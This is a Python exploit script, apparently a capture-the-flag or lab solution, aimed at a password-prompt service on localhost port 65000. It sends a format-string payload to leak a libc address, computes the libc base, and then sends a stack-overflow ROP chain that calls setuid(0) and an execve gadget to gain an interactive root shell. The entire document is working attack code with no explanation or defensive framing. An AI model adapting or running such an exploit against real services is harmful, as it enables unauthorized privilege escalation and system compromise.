import struct
from telnetlib import Telnet
import socket

pack = lambda x: struct.pack("Q", x)

def leaker_payload():

    leak_payload = b'%27$p' # leak __libc_start_main+241
    leak_payload += b'A' * (0x80 - len(leak_payload)) # fill buffer
    leak_payload += b'BBBBBBBB' # rbp
    leak_payload += pack(0x4006c9) # return to vuln (password_is_correct)

    return leak_payload

def get_libc_base(__libc_start_main_241):

    __libc_start_main_241 = int(__libc_start_main_241, 16)
    libc_base = __libc_start_main_241 - 241 - 0x201f0

    return libc_base

def root_shell(libc_base):

    libc_base = int(libc_base)
    execve = pack(libc_base + 0xd6b9f) # execve offset
    setuid = pack(libc_base + 0xb8fa0) # setuid offset
    pop_rdi = pack(0x400813) # pop rdi, from the executable

    return b'A' * 0x80 + b'BBBBBBBB' + pop_rdi + pack(0) + setuid + execve

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

skt.connect(('localhost', 65000))

server = Telnet()
server.sock = skt

server.read_until(b'insert the password: ')

print("[!] sending leak payload")
server.write(leaker_payload())

leakage = server.read_until(b'\n')

libc_base = get_libc_base(str(leakage).split('your input: 0x')[1].split('AAAAA')[0])

print("[+] libc base address: ", hex(libc_base))

print("[!] sending root payload")
server.write(root_shell(libc_base))
server.interact()

server.close()
